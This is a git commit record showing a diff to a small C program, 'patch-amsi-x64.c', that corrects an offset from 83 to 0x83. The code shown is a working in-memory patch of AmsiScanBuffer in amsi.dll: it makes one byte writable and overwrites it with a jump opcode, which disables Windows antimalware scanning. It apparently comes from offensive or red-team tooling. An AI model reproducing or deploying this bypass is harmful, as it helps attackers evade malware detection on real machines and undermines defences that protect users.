3f9301a7ec5dffc62e6f916ca527bb627e95b076
Mr.Un1k0d3r <mr.un1k0d3r@gmail.com>
2022-11-10 10:39:25 -0500

    Update patch-amsi-x64.c

--- patch-amsi-x64.c
+++ patch-amsi-x64.c
@@ -2,7 +2,7 @@
 
 int main() {
 	DWORD dwOld = 0;
-	DWORD offset = 83;
+	DWORD offset = 0x83;
 	FARPROC ptrAmsiScanBuffer = GetProcAddress(LoadLibrary("amsi.dll"), "AmsiScanBuffer");
 	VirtualProtect(ptrAmsiScanBuffer + offset, 1, PAGE_EXECUTE_READWRITE, &dwOld);
 	memcpy(ptrAmsiScanBuffer + offset, "\x74", 1);
